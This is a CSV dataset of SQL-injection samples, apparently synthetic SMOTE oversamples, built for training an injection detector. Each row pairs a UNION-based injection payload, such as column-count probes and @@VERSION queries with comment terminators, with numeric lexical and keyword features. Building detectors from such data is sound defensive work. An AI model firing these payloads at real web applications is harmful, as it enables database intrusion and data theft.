id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000011,attack,union," select * from users where id  =  1 union select @ $$,version  (    )   -- 1",nearest_attack_euclidean,R000026,0.15841209327840677,76.11053672683217,25.889463273167838,3.854104607109604,40.44214690732865,1.9999999999999982,23.889463273167838,9.778926546335677,0.5313024087292704,0.02627801205508129,0.3139006027540642,0.12851897646158406,0.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,1.0000000000000004,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000012,attack,union,"1  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000034,0.1566812034101702,70.16658259357678,15.0,3.054225202113849,49.666834812846446,1.0,8.499747780730331,11.0,0.7080058149246851,0.014252662183814102,0.12096223886954542,0.15677928402195546,0.0,0.0,2.0,0.0,0.0,0.0,0.0,1.0832912967883885,0.0,0.0,7.9167087032116115,2.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000013,attack,union,"-6667%""   )    )    union all select 7348,7348,7348,7348,7348,7348,7348,7348#",nearest_attack_euclidean,R000054,0.40681683557789905,75.04737195671908,22.162719003606743,3.8325649594127604,14.000000000000002,35.34912398557303,13.023685978359538,12.674561992786513,0.18728007844274389,0.4715638674220252,0.17225986272519828,0.16889619141003268,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.8372809963932561,1.0,0.0,6.837280996393256,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000014,attack,union,"1'+  (  select vlut where 9517  =  9517 union all select null,null,null--",nearest_attack_euclidean,R000045,0.22725358349224337,72.46847526524023,24.84813579006864,4.000316843601134,40.54440737020592,9.0,14.92406789503432,8.0,0.5592640622976717,0.12428055678971311,0.2059837748773146,0.11047160603530057,1.0,0.0,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,2.075932104965681,3.924067895034319,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.924067895034319,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.924067895034319
SMOTE_000015,attack,union,"-3790""  )   as ojgb where 5925  =  5925 union all select 5925,5925#",nearest_attack_euclidean,R000066,0.3540334300257452,67.3784696798732,28.495373760169063,4.108602372931333,26.009252479661875,18.61227784046492,16.756939359746408,6.0,0.3855347919276153,0.27706891720974103,0.24832823501599957,0.08906805584664408,0.0,1.0,0.8738434400422654,0.0,0.0,1.0,0.0,1.1261565599577346,0.0,0.0,1.0000000000000004,1.8738434400422654,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000016,attack,union,"-3781%'  )   union all select 7497,7497,7497,7497,7497--",nearest_attack_euclidean,R000132,0.051500395907722346,56.10290407236437,21.985299418233662,3.8969300435106295,14.000000000000002,23.941197672934646,8.147005817663384,10.014700581766338,0.2495916505064906,0.42693803059739094,0.14495722596661975,0.17851309292949866,1.0,0.0,3.0,0.0,0.0,0.0,0.0,1.0294011635326765,1.0,0.0,3.9852994182336614,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000017,attack,union," select * from users where id  =  1 or \+<$ union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000006,0.21213408416616425,73.0,33.0,4.400124178606237,42.0,3.0,17.0,11.0,0.5753424657534246,0.0410958904109589,0.2328767123287671,0.1506849315068493,0.0,0.0,2.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0000000000000004,5.655806195173952,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000018,attack,union," select * from users where id  =  1 union select @ 1a,version  (    )   -- 1",nearest_attack_euclidean,R000011,0.6239106303790454,76.54215471764908,25.45784528235092,3.85322409258658,42.16861887059632,1.9999999999999982,23.45784528235092,8.91569056470184,0.5507738970368006,0.02613050078002424,0.30652503900121186,0.11657056318196327,0.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,1.0000000000000004,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000019,attack,union,"-8073   )    )     )   union all select 4481,4481,4481,4481--",nearest_attack_euclidean,R000116,0.7431006202795135,58.7774404743287,20.0,3.690361493978808,14.000000000000002,20.0,16.22195237946296,8.555488094865739,0.2386170472363578,0.34088149605193974,0.27504249608001285,0.14545896063168964,0.0,0.0,3.0,0.0,0.0,0.0,0.0,2.5554880948657397,0.0,0.0,3.0,3.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000020,attack,union,"1'   )    )    union all select null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000076,1.1691018749868627,72.67435569486355,16.308974593224033,3.1408158504728494,46.292304881311615,1.0,14.0,11.382050813551936,0.6350834242667114,0.013878714554759114,0.19430200376662757,0.15673585741190196,1.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.3089745932240321,0.0,7.073076220327904,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000021,attack,union," select * from users where id  =  1 union select @ $_,version  (    )   -- 1",nearest_attack_euclidean,R000003,0.2291391565202504,75.66069770033864,26.660697700338652,3.8634525728482,40.0,1.9999999999999982,24.0,9.66069770033865,0.5286968582432375,0.02643484291216186,0.31721811494594254,0.12765018389865804,0.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,1.0,1.0000000000000004,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000022,attack,union,"-7460"" union all select 4273,4273,4273,4273,4273,4273,4273,4273#",nearest_attack_euclidean,R000060,1.2890574052425603,60.47879190954563,20.60875465661618,3.682694674652219,14.000000000000002,32.87003725292945,4.0,9.608754656616181,0.23275480490521624,0.5416039418874552,0.06650137283006177,0.15913988037726684,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.3912453433838189,0.0,6.2175093132323624,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000023,attack,union,"1""   )    )     )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000068,0.37658994149348285,69.97817589556277,16.0,3.1714693742990256,39.58254071645022,1.0,18.0,11.395635179112555,0.5653590017500463,0.014307377942070348,0.2575328029572663,0.16280081735061708,0.0,1.0,2.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,5.3956351791125545,2.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000024,attack,union,"1   )    )    union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000154,0.7161528623096466,72.21618363444259,15.21618363444259,3.108363526332354,45.13526546222964,1.0,14.864734537770358,11.21618363444259,0.6251511921796375,0.013847758060418075,0.205714291445447,0.15528675831449734,0.0,0.21618363444258942,2.0,0.0,0.0,0.0,0.0,2.216183634442589,0.0,0.0,6.78381636555741,2.0,0.0,0.21618363444258948,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000025,attack,union,"-3781%'  )   union all select 7497,7497,7497,7497,7497--",nearest_attack_euclidean,R000132,0.22143287720420798,56.618013991317255,21.93133177874253,3.8979812105172162,14.000000000000002,24.54934577005978,8.0,10.068668221257473,0.24762302311031828,0.4329480844317949,0.14149887034875328,0.1779300221091335,1.0,0.0,3.0,0.0,0.0,0.0,0.0,1.0,0.9313317787425276,0.0,4.137336442514945,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000026,attack,union," select * from users where id  =  1 +$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000009,1.3367401661199412,73.9553352414469,32.0,4.378814174116945,44.0,1.9999999999999982,17.0,10.95533524144691,0.5950621460048102,0.02704827936385501,0.22991037459276759,0.14797920003856718,0.0,0.0,2.0,0.0,1.4776676207234551,1.0,0.0,0.0,0.0,0.0,1.0000000000000004,5.95533524144691,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000027,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R000120,1.4927429236151342,58.82869097980734,22.276230326602445,3.911517150412599,24.104921306409786,16.0,12.08565451009633,6.638115163301223,0.4074591783118327,0.2726500579204419,0.20718608773114616,0.11270467603657922,1.0,0.0,3.0,0.0,0.0,0.36188483669877675,0.0,1.0,0.0,0.0,1.276230326602446,3.361884836698777,1.0,0.0,1.0,0.0,0.0,0.36188483669877675,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.3618848366987768,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.361884836698777
SMOTE_000028,attack,union,"-1368   )    )    union all select 1310,1310,1310,1310,1310#",nearest_attack_euclidean,R000119,1.4295760476140593,60.473482749828904,20.946965499657814,3.7010251614222662,14.000000000000002,24.0,14.0,8.473482749828907,0.231522197131802,0.3968951950830891,0.231522197131802,0.14006041065330688,0.0,0.4734827498289078,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,4.0,1.0,0.0,0.4734827498289078,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000029,attack,union,"-9050 union all select 9346,9346,9346,9346,9346,9346,9346,9346,9346,9346--",nearest_attack_euclidean,R000070,0.4470583000561959,71.56687306020787,19.0,3.6509963561686027,14.000000000000002,42.053498448166295,4.0,11.513374612041574,0.1958605125650391,0.5873514435008147,0.05596014644715405,0.16082789748699217,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.513374612041574,3.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000030,attack,union,"1""  )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000141,0.2302210550215978,59.784987688162445,16.0,3.231014890994592,41.02799015052996,1.0,8.0,9.756997537632488,0.6861059473886137,0.01674912538402737,0.13399300307221912,0.16315192415513974,0.0,1.0,2.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,5.756997537632489,2.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000031,attack,union,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",nearest_attack_euclidean,R000036,0.44060686409070804,63.586459103794596,20.71729182075892,3.848963036128323,14.000000000000002,31.43458364151784,7.434583641517839,10.71729182075892,0.22092016015297222,0.4946800686369881,0.11595979408903574,0.16843997712100398,1.0,0.0,3.0,0.0,0.0,0.0,0.0,0.8586459103794598,0.0,0.0,5.85864591037946,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.8586459103794597,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000032,attack,union,"-4966%"" union all select 4300,4300,4300,4300,4300,4300,4300,4300#",nearest_attack_euclidean,R000062,0.9516131446537414,66.30307764588271,21.325769411470677,3.6899812982130493,14.000000000000002,37.303077645882716,4.0,11.0,0.21131703744874963,0.5622718509990188,0.06037629641392847,0.16603481513830326,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.674230588529321,0.0,7.325769411470679,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
